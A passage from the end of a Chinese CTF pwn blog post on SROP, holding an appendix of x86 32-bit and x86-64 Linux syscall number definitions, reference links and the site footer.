__NR_rt_sigpending 176<br>#define __NR_rt_sigtimedwait 177<br>#define __NR_rt_sigqueueinfo 178<br>#define __NR_rt_sigsuspend 179<br>#define __NR_pread64 180<br>#define __NR_pwrite64 181<br>#define __NR_chown 182<br>#define __NR_getcwd 183<br>#define __NR_capget 184<br>#define __NR_capset 185<br>#define __NR_sigaltstack 186<br>#define __NR_sendfile 187<br>#define __NR_getpmsg 188<br>#define __NR_putpmsg 189<br>#define __NR_vfork 190<br>#define __NR_ugetrlimit 191<br>#define __NR_mmap2 192<br>#define __NR_truncate64 193<br>#define __NR_ftruncate64 194<br>#define __NR_stat64 195<br>#define __NR_lstat64 196<br>#define __NR_fstat64 197<br>#define __NR_lchown32 198<br>#define __NR_getuid32 199<br>#define __NR_getgid32 200<br>#define __NR_geteuid32 201<br>#define __NR_getegid32 202<br>#define __NR_setreuid32 203<br>#define __NR_setregid32 204<br>#define __NR_getgroups32 205<br>#define __NR_setgroups32 206<br>#define __NR_fchown32 207<br>#define __NR_setresuid32 208<br>#define __NR_getresuid32 209<br>#define __NR_setresgid32 210<br>#define __NR_getresgid32 211<br>#define __NR_chown32 212<br>#define __NR_setuid32 213<br>#define __NR_setgid32 214<br>#define __NR_setfsuid32 215<br>#define __NR_setfsgid32 216<br>#define __NR_pivot_root 217<br>#define __NR_mincore 218<br>#define __NR_madvise 219<br>#define __NR_getdents64 220<br>#define __NR_fcntl64 221<br>#define __NR_gettid 224<br>#define __NR_readahead 225<br>#define __NR_setxattr 226<br>#define __NR_lsetxattr 227<br>#define __NR_fsetxattr 228<br>#define __NR_getxattr 229<br>#define __NR_lgetxattr 230<br>#define __NR_fgetxattr 231<br>#define __NR_listxattr 232<br>#define __NR_llistxattr 233<br>#define __NR_flistxattr 234<br>#define __NR_removexattr 235<br>#define __NR_lremovexattr 236<br>#define __NR_fremovexattr 237<br>#define __NR_tkill 238<br>#define __NR_sendfile64 239<br>#define __NR_futex 240<br>#define __NR_sched_setaffinity 241<br>#define __NR_sched_getaffinity 242<br>#define __NR_set_thread_area 243<br>#define __NR_get_thread_area 244<br>#define __NR_io_setup 245<br>#define __NR_io_destroy 246<br>#define __NR_io_getevents 247<br>#define __NR_io_submit 248<br>#define __NR_io_cancel 249<br>#define __NR_fadvise64 250<br>#define __NR_exit_group 252<br>#define __NR_lookup_dcookie 253<br>#define __NR_epoll_create 254<br>#define __NR_epoll_ctl 255<br>#define __NR_epoll_wait 256<br>#define __NR_remap_file_pages 257<br>#define __NR_set_tid_address 258<br>#define __NR_timer_create 259<br>#define __NR_timer_settime 260<br>#define __NR_timer_gettime 261<br>#define __NR_timer_getoverrun 262<br>#define __NR_timer_delete 263<br>#define __NR_clock_settime 264<br>#define __NR_clock_gettime 265<br>#define __NR_clock_getres 266<br>#define __NR_clock_nanosleep 267<br>#define __NR_statfs64 268<br>#define __NR_fstatfs64 269<br>#define __NR_tgkill 270<br>#define __NR_utimes 271<br>#define __NR_fadvise64_64 272<br>#define __NR_vserver 273<br>#define __NR_mbind 274<br>#define __NR_get_mempolicy 275<br>#define __NR_set_mempolicy 276<br>#define __NR_mq_open 277<br>#define __NR_mq_unlink 278<br>#define __NR_mq_timedsend 279<br>#define __NR_mq_timedreceive 280<br>#define __NR_mq_notify 281<br>#define __NR_mq_getsetattr 282<br>#define __NR_kexec_load 283<br>#define __NR_waitid 284<br>#define __NR_add_key 286<br>#define __NR_request_key 287<br>#define __NR_keyctl 288<br>#define __NR_ioprio_set 289<br>#define __NR_ioprio_get 290<br>#define __NR_inotify_init 291<br>#define __NR_inotify_add_watch 292<br>#define __NR_inotify_rm_watch 293<br>#define __NR_migrate_pages 294<br>#define __NR_openat 295<br>#define __NR_mkdirat 296<br>#define __NR_mknodat 297<br>#define __NR_fchownat 298<br>#define __NR_futimesat 299<br>#define __NR_fstatat64 300<br>#define __NR_unlinkat 301<br>#define __NR_renameat 302<br>#define __NR_linkat 303<br>#define __NR_symlinkat 304<br>#define __NR_readlinkat 305<br>#define __NR_fchmodat 306<br>#define __NR_faccessat 307<br>#define __NR_pselect6 308<br>#define __NR_ppoll 309<br>#define __NR_unshare 310<br>#define __NR_set_robust_list 311<br>#define __NR_get_robust_list 312<br>#define __NR_splice 313<br>#define __NR_sync_file_range 314<br>#define __NR_tee 315<br>#define __NR_vmsplice 316<br>#define __NR_move_pages 317<br>#define __NR_getcpu 318<br>#define __NR_epoll_pwait 319<br>#define __NR_utimensat 320<br>#define __NR_signalfd 321<br>#define __NR_timerfd_create 322<br>#define __NR_eventfd 323<br>#define __NR_fallocate 324<br>#define __NR_timerfd_settime 325<br>#define __NR_timerfd_gettime 326<br>#define __NR_signalfd4 327<br>#define __NR_eventfd2 328<br>#define __NR_epoll_create1 329<br>#define __NR_dup3 330<br>#define __NR_pipe2 331<br>#define __NR_inotify_init1 332<br>#define __NR_preadv 333<br>#define __NR_pwritev 334<br>#define __NR_rt_tgsigqueueinfo 335<br>#define __NR_perf_event_open 336<br>#define __NR_recvmmsg 337<br>#define __NR_fanotify_init 338<br>#define __NR_fanotify_mark 339<br>#define __NR_prlimit64 340<br>#define __NR_name_to_handle_at 341<br>#define __NR_open_by_handle_at 342<br>#define __NR_clock_adjtime 343<br>#define __NR_syncfs 344<br>#define __NR_sendmmsg 345<br>#define __NR_setns 346<br>#define __NR_process_vm_readv 347<br>#define __NR_process_vm_writev 348<br>#define __NR_kcmp 349<br>#define __NR_finit_module 350<br>#define __NR_sched_setattr 351<br>#define __NR_sched_getattr 352<br>#define __NR_renameat2 353<br>#define __NR_seccomp 354<br>#define __NR_getrandom 355<br>#define __NR_memfd_create 356<br>#define __NR_bpf 357<br>#define __NR_execveat 358<br>#define __NR_socket 359<br>#define __NR_socketpair 360<br>#define __NR_bind 361<br>#define __NR_connect 362<br>#define __NR_listen 363<br>#define __NR_accept4 364<br>#define __NR_getsockopt 365<br>#define __NR_setsockopt 366<br>#define __NR_getsockname 367<br>#define __NR_getpeername 368<br>#define __NR_sendto 369<br>#define __NR_sendmsg 370<br>#define __NR_recvfrom 371<br>#define __NR_recvmsg 372<br>#define __NR_shutdown 373<br>#define __NR_userfaultfd 374<br>#define __NR_membarrier 375<br>#define __NR_mlock2 376<br>#define __NR_copy_file_range 377<br>#define __NR_preadv2 378<br>#define __NR_pwritev2 379<br><br>#endif /* _ASM_X86_UNISTD_32_H */<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/0b72d367-1b5e-44be-a975-83c57cd55fed'><img src="blob:https://tokameine.top/0b72d367-1b5e-44be-a975-83c57cd55fed"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#ifndef _ASM_X86_UNISTD_64_H<br>#define _ASM_X86_UNISTD_64_H 1<br><br>#define __NR_read 0<br>#define __NR_write 1<br>#define __NR_open 2<br>#define __NR_close 3<br>#define __NR_stat 4<br>#define __NR_fstat 5<br>#define __NR_lstat 6<br>#define __NR_poll 7<br>#define __NR_lseek 8<br>#define __NR_mmap 9<br>#define __NR_mprotect 10<br>#define __NR_munmap 11<br>#define __NR_brk 12<br>#define __NR_rt_sigaction 13<br>#define __NR_rt_sigprocmask 14<br>#define __NR_rt_sigreturn 15<br>#define __NR_ioctl 16<br>#define __NR_pread64 17<br>#define __NR_pwrite64 18<br>#define __NR_readv 19<br>#define __NR_writev 20<br>#define __NR_access 21<br>#define __NR_pipe 22<br>#define __NR_select 23<br>#define __NR_sched_yield 24<br>#define __NR_mremap 25<br>#define __NR_msync 26<br>#define __NR_mincore 27<br>#define __NR_madvise 28<br>#define __NR_shmget 29<br>#define __NR_shmat 30<br>#define __NR_shmctl 31<br>#define __NR_dup 32<br>#define __NR_dup2 33<br>#define __NR_pause 34<br>#define __NR_nanosleep 35<br>#define __NR_getitimer 36<br>#define __NR_alarm 37<br>#define __NR_setitimer 38<br>#define __NR_getpid 39<br>#define __NR_sendfile 40<br>#define __NR_socket 41<br>#define __NR_connect 42<br>#define __NR_accept 43<br>#define __NR_sendto 44<br>#define __NR_recvfrom 45<br>#define __NR_sendmsg 46<br>#define __NR_recvmsg 47<br>#define __NR_shutdown 48<br>#define __NR_bind 49<br>#define __NR_listen 50<br>#define __NR_getsockname 51<br>#define __NR_getpeername 52<br>#define __NR_socketpair 53<br>#define __NR_setsockopt 54<br>#define __NR_getsockopt 55<br>#define __NR_clone 56<br>#define __NR_fork 57<br>#define __NR_vfork 58<br>#define __NR_execve 59<br>#define __NR_exit 60<br>#define __NR_wait4 61<br>#define __NR_kill 62<br>#define __NR_uname 63<br>#define __NR_semget 64<br>#define __NR_semop 65<br>#define __NR_semctl 66<br>#define __NR_shmdt 67<br>#define __NR_msgget 68<br>#define __NR_msgsnd 69<br>#define __NR_msgrcv 70<br>#define __NR_msgctl 71<br>#define __NR_fcntl 72<br>#define __NR_flock 73<br>#define __NR_fsync 74<br>#define __NR_fdatasync 75<br>#define __NR_truncate 76<br>#define __NR_ftruncate 77<br>#define __NR_getdents 78<br>#define __NR_getcwd 79<br>#define __NR_chdir 80<br>#define __NR_fchdir 81<br>#define __NR_rename 82<br>#define __NR_mkdir 83<br>#define __NR_rmdir 84<br>#define __NR_creat 85<br>#define __NR_link 86<br>#define __NR_unlink 87<br>#define __NR_symlink 88<br>#define __NR_readlink 89<br>#define __NR_chmod 90<br>#define __NR_fchmod 91<br>#define __NR_chown 92<br>#define __NR_fchown 93<br>#define __NR_lchown 94<br>#define __NR_umask 95<br>#define __NR_gettimeofday 96<br>#define __NR_getrlimit 97<br>#define __NR_getrusage 98<br>#define __NR_sysinfo 99<br>#define __NR_times 100<br>#define __NR_ptrace 101<br>#define __NR_getuid 102<br>#define __NR_syslog 103<br>#define __NR_getgid 104<br>#define __NR_setuid 105<br>#define __NR_setgid 106<br>#define __NR_geteuid 107<br>#define __NR_getegid 108<br>#define __NR_setpgid 109<br>#define __NR_getppid 110<br>#define __NR_getpgrp 111<br>#define __NR_setsid 112<br>#define __NR_setreuid 113<br>#define __NR_setregid 114<br>#define __NR_getgroups 115<br>#define __NR_setgroups 116<br>#define __NR_setresuid 117<br>#define __NR_getresuid 118<br>#define __NR_setresgid 119<br>#define __NR_getresgid 120<br>#define __NR_getpgid 121<br>#define __NR_setfsuid 122<br>#define __NR_setfsgid 123<br>#define __NR_getsid 124<br>#define __NR_capget 125<br>#define __NR_capset 126<br>#define __NR_rt_sigpending 127<br>#define __NR_rt_sigtimedwait 128<br>#define __NR_rt_sigqueueinfo 129<br>#define __NR_rt_sigsuspend 130<br>#define __NR_sigaltstack 131<br>#define __NR_utime 132<br>#define __NR_mknod 133<br>#define __NR_uselib 134<br>#define __NR_personality 135<br>#define __NR_ustat 136<br>#define __NR_statfs 137<br>#define __NR_fstatfs 138<br>#define __NR_sysfs 139<br>#define __NR_getpriority 140<br>#define __NR_setpriority 141<br>#define __NR_sched_setparam 142<br>#define __NR_sched_getparam 143<br>#define __NR_sched_setscheduler 144<br>#define __NR_sched_getscheduler 145<br>#define __NR_sched_get_priority_max 146<br>#define __NR_sched_get_priority_min 147<br>#define __NR_sched_rr_get_interval 148<br>#define __NR_mlock 149<br>#define __NR_munlock 150<br>#define __NR_mlockall 151<br>#define __NR_munlockall 152<br>#define __NR_vhangup 153<br>#define __NR_modify_ldt 154<br>#define __NR_pivot_root 155<br>#define __NR__sysctl 156<br>#define __NR_prctl 157<br>#define __NR_arch_prctl 158<br>#define __NR_adjtimex 159<br>#define __NR_setrlimit 160<br>#define __NR_chroot 161<br>#define __NR_sync 162<br>#define __NR_acct 163<br>#define __NR_settimeofday 164<br>#define __NR_mount 165<br>#define __NR_umount2 166<br>#define __NR_swapon 167<br>#define __NR_swapoff 168<br>#define __NR_reboot 169<br>#define __NR_sethostname 170<br>#define __NR_setdomainname 171<br>#define __NR_iopl 172<br>#define __NR_ioperm 173<br>#define __NR_create_module 174<br>#define __NR_init_module 175<br>#define __NR_delete_module 176<br>#define __NR_get_kernel_syms 177<br>#define __NR_query_module 178<br>#define __NR_quotactl 179<br>#define __NR_nfsservctl 180<br>#define __NR_getpmsg 181<br>#define __NR_putpmsg 182<br>#define __NR_afs_syscall 183<br>#define __NR_tuxcall 184<br>#define __NR_security 185<br>#define __NR_gettid 186<br>#define __NR_readahead 187<br>#define __NR_setxattr 188<br>#define __NR_lsetxattr 189<br>#define __NR_fsetxattr 190<br>#define __NR_getxattr 191<br>#define __NR_lgetxattr 192<br>#define __NR_fgetxattr 193<br>#define __NR_listxattr 194<br>#define __NR_llistxattr 195<br>#define __NR_flistxattr 196<br>#define __NR_removexattr 197<br>#define __NR_lremovexattr 198<br>#define __NR_fremovexattr 199<br>#define __NR_tkill 200<br>#define __NR_time 201<br>#define __NR_futex 202<br>#define __NR_sched_setaffinity 203<br>#define __NR_sched_getaffinity 204<br>#define __NR_set_thread_area 205<br>#define __NR_io_setup 206<br>#define __NR_io_destroy 207<br>#define __NR_io_getevents 208<br>#define __NR_io_submit 209<br>#define __NR_io_cancel 210<br>#define __NR_get_thread_area 211<br>#define __NR_lookup_dcookie 212<br>#define __NR_epoll_create 213<br>#define __NR_epoll_ctl_old 214<br>#define __NR_epoll_wait_old 215<br>#define __NR_remap_file_pages 216<br>#define __NR_getdents64 217<br>#define __NR_set_tid_address 218<br>#define __NR_restart_syscall 219<br>#define __NR_semtimedop 220<br>#define __NR_fadvise64 221<br>#define __NR_timer_create 222<br>#define __NR_timer_settime 223<br>#define __NR_timer_gettime 224<br>#define __NR_timer_getoverrun 225<br>#define __NR_timer_delete 226<br>#define __NR_clock_settime 227<br>#define __NR_clock_gettime 228<br>#define __NR_clock_getres 229<br>#define __NR_clock_nanosleep 230<br>#define __NR_exit_group 231<br>#define __NR_epoll_wait 232<br>#define __NR_epoll_ctl 233<br>#define __NR_tgkill 234<br>#define __NR_utimes 235<br>#define __NR_vserver 236<br>#define __NR_mbind 237<br>#define __NR_set_mempolicy 238<br>#define __NR_get_mempolicy 239<br>#define __NR_mq_open 240<br>#define __NR_mq_unlink 241<br>#define __NR_mq_timedsend 242<br>#define __NR_mq_timedreceive 243<br>#define __NR_mq_notify 244<br>#define __NR_mq_getsetattr 245<br>#define __NR_kexec_load 246<br>#define __NR_waitid 247<br>#define __NR_add_key 248<br>#define __NR_request_key 249<br>#define __NR_keyctl 250<br>#define __NR_ioprio_set 251<br>#define __NR_ioprio_get 252<br>#define __NR_inotify_init 253<br>#define __NR_inotify_add_watch 254<br>#define __NR_inotify_rm_watch 255<br>#define __NR_migrate_pages 256<br>#define __NR_openat 257<br>#define __NR_mkdirat 258<br>#define __NR_mknodat 259<br>#define __NR_fchownat 260<br>#define __NR_futimesat 261<br>#define __NR_newfstatat 262<br>#define __NR_unlinkat 263<br>#define __NR_renameat 264<br>#define __NR_linkat 265<br>#define __NR_symlinkat 266<br>#define __NR_readlinkat 267<br>#define __NR_fchmodat 268<br>#define __NR_faccessat 269<br>#define __NR_pselect6 270<br>#define __NR_ppoll 271<br>#define __NR_unshare 272<br>#define __NR_set_robust_list 273<br>#define __NR_get_robust_list 274<br>#define __NR_splice 275<br>#define __NR_tee 276<br>#define __NR_sync_file_range 277<br>#define __NR_vmsplice 278<br>#define __NR_move_pages 279<br>#define __NR_utimensat 280<br>#define __NR_epoll_pwait 281<br>#define __NR_signalfd 282<br>#define __NR_timerfd_create 283<br>#define __NR_eventfd 284<br>#define __NR_fallocate 285<br>#define __NR_timerfd_settime 286<br>#define __NR_timerfd_gettime 287<br>#define __NR_accept4 288<br>#define __NR_signalfd4 289<br>#define __NR_eventfd2 290<br>#define __NR_epoll_create1 291<br>#define __NR_dup3 292<br>#define __NR_pipe2 293<br>#define __NR_inotify_init1 294<br>#define __NR_preadv 295<br>#define __NR_pwritev 296<br>#define __NR_rt_tgsigqueueinfo 297<br>#define __NR_perf_event_open 298<br>#define __NR_recvmmsg 299<br>#define __NR_fanotify_init 300<br>#define __NR_fanotify_mark 301<br>#define __NR_prlimit64 302<br>#define __NR_name_to_handle_at 303<br>#define __NR_open_by_handle_at 304<br>#define __NR_clock_adjtime 305<br>#define __NR_syncfs 306<br>#define __NR_sendmmsg 307<br>#define __NR_setns 308<br>#define __NR_getcpu 309<br>#define __NR_process_vm_readv 310<br>#define __NR_process_vm_writev 311<br>#define __NR_kcmp 312<br>#define __NR_finit_module 313<br>#define __NR_sched_setattr 314<br>#define __NR_sched_getattr 315<br>#define __NR_renameat2 316<br>#define __NR_seccomp 317<br>#define __NR_getrandom 318<br>#define __NR_memfd_create 319<br>#define __NR_kexec_file_load 320<br>#define __NR_bpf 321<br>#define __NR_execveat 322<br>#define __NR_userfaultfd 323<br>#define __NR_membarrier 324<br>#define __NR_mlock2 325<br>#define __NR_copy_file_range 326<br>#define __NR_preadv2 327<br>#define __NR_pwritev2 328<br><br>#endif /* _ASM_X86_UNISTD_64_H */<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='blob:https://tokameine.top/79ec1fe9-83ad-456b-894c-7cc4d346cc68'><img src="blob:https://tokameine.top/79ec1fe9-83ad-456b-894c-7cc4d346cc68"></p>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_1">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_1</a> ​</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/09b4aed52e0d">https://www.jianshu.com/p/09b4aed52e0d</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/74aa44767a4b">https://www.jianshu.com/p/74aa44767a4b</a></p>
<p>插画ID：91506229</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2021/09/04/pwnable-3x17/">← Next pwnable - 3x17 分析与思考</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2021/08/21/seccon-ctf-2016-quals-chat/">SECCON CTF 2016 Quals - Chat 分析与思考 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E6%96%87%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">正文：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Signal-%E6%9C%BA%E5%88%B6-%C2%B6"><span class="toc-number"></span> <span class="toc-text">Signal 机制 </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A360chunqiu2017-smallest"><span class="toc-number">1.</span> <span class="toc-text">例题：360chunqiu2017_smallest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E5%BD%95%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">附录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">参考文章：</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>